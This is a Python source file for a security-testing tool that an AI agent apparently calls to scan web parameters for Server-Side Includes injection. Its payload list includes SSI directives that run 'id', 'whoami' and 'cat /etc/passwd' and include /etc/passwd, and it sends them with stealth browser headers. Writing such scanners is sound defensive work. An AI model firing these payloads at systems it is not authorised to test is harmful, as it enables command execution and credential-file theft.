"""
SSI INJECTION SCANNER
=====================
Test for Server-Side Includes (SSI) injection vulnerabilities.

Usage:
    from tools.ssi_injection_scanner import ssi_injection_scanner
"""

import json
import requests
import re
import time
from urllib.parse import quote, urlparse
from langchain.tools import tool
from core.rate_limiter import rate_limiter
from core.cancellation import check_cancelled
from core.checkpoint import require_approval
from core.auth_store import get_auth_kwargs
from engines.stealth_engine import stealth

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass


def _domain_of(url: str) -> str:
    try:
        return urlparse(url).netloc.split(":")[0].lower()
    except Exception:
        return url


def _logger():
    from tools.custom_tools import exec_logger
    return exec_logger


# SSI Injection payloads
SSI_PAYLOADS = [
    # Basic SSI command execution
    ('<!--#exec cmd="id"-->', ["uid=", "gid="], "SSI command execution (id)"),
    ('<!--#exec cmd="whoami"-->', ["root", "www-data", "apache", "nginx"], "SSI command execution (whoami)"),
    ('<!--#exec cmd="cat /etc/passwd"-->', ["root:x:", "bin:x:"], "SSI file read (/etc/passwd)"),

    # SSI file inclusion
    ('<!--#include virtual="/etc/passwd"-->', ["root:x:", "bin:x:"], "SSI file inclusion (/etc/passwd)"),
    ('<!--#include file="/etc/passwd"-->', ["root:x:", "bin:x:"], "SSI file inclusion (file=)"),

    # SSI echo (environment variables)
    ('<!--#echo var="DOCUMENT_ROOT"-->', ["/var/www", "/usr/share", "/home"], "SSI echo DOCUMENT_ROOT"),
    ('<!--#echo var="SERVER_NAME"-->', [], "SSI echo SERVER_NAME"),

    # SSI date/time (less dangerous but confirms SSI)
    ('<!--#echo var="DATE_LOCAL"-->', [], "SSI date echo"),
    ('<!--#config timefmt="%A %d %B %Y"-->', [], "SSI config timefmt"),

    # SSI with payload variations
    ('<!--#exec cmd="id" -->', ["uid=", "gid="], "SSI with spaces"),
    ('<!--#EXEC cmd="id"-->', ["uid=", "gid="], "SSI uppercase EXEC"),
    ('<!--#exec cmd="id"-->', ["uid=", "gid="], "SSI lowercase cmd"),
]


@tool("ssi_injection_scanner")
def ssi_injection_scanner(url: str, params: str = "") -> str:
    """
    Scan for Server-Side Includes (SSI) injection vulnerabilities.
    Tests SSI directives in parameters to detect SSI processing.

    Args:
        url: Target URL
        params: Comma-separated parameter names to test
    """
    tool_name = "SSI Injection Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting SSI injection scan on {url}")
    if check_cancelled(logger): return "CANCELLED: job cancelled by user."

    approved = require_approval(
        action=f"SSI injection scan on {url}",
        context=f"Test SSI directives on {params or 'default'} parameters",
        risk="medium",
        exec_logger=logger,
    )
    if not approved:
        return "CANCELLED: approval rejected or timeout."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)

    param_list = [p.strip() for p in params.split(",")] if params else [
        "page", "file", "include", "template", "view",
        "doc", "path", "lang", "section", "content",
    ]

    vulnerabilities = []
    tested = 0

    logger.add_log(tool_name, "PROCESSING",
        f"Testing {len(param_list)} params x {len(SSI_PAYLOADS)} payloads")

    for param in param_list:
        if check_cancelled(logger): break

        for payload, indicators, description in SSI_PAYLOADS:
            try:
                rate_limiter.wait(domain)
                test_url = f"{url}{'&' if '?' in url else '?'}{param}={quote(payload)}"

                stealth_headers = stealth.get_browser_headers(test_url)
                resp = requests.get(
                    test_url,
                    headers=stealth_headers,
                    timeout=5,
                    verify=False,
                    **auth_kwargs,
                )
                tested += 1

                # Check if SSI was processed
                if indicators:
                    # Check for command output in response
                    if any(ind in resp.text for ind in indicators):
                        vulnerabilities.append({
                            "parameter": param,
                            "payload": payload,
                            "type": "SSI Injection (Command Execution)",
                            "description": description,
                            "severity": "Critical",
                            "evidence": f"SSI command output detected in response",
                            "status_code": resp.status_code,
                        })
                        logger.add_log(tool_name, "WARNING",
                            f"SSI injection confirmed: param={param}, type={description}")
                        break  # One confirmed per param
                else:
                    # Check if SSI was processed (no output expected, but no error = SSI active)
                    if resp.status_code == 200 and "error" not in resp.text.lower():
                        # Check if the payload was NOT reflected (SSI consumed it)
                        if payload not in resp.text:
                            vulnerabilities.append({
                                "parameter": param,
                                "payload": payload,
                                "type": "SSI Injection (Possible)",
                                "description": description,
                                "severity": "Medium",
                                "evidence": "SSI payload consumed by server (not reflected) — SSI processing likely active",
                                "status_code": resp.status_code,
                            })
                            break

            except Exception:
                continue

    result = {
        "status": "VULNERABLE" if vulnerabilities else "SAFE",
        "vulnerabilities": vulnerabilities,
        "count": len(vulnerabilities),
        "total_tested": tested,
        "params_tested": param_list,
    }

    logger.add_log(tool_name, "SUCCESS",
        f"SSI injection scan complete. {tested} tests, {len(vulnerabilities)} findings")
    return json.dumps(result, indent=2)
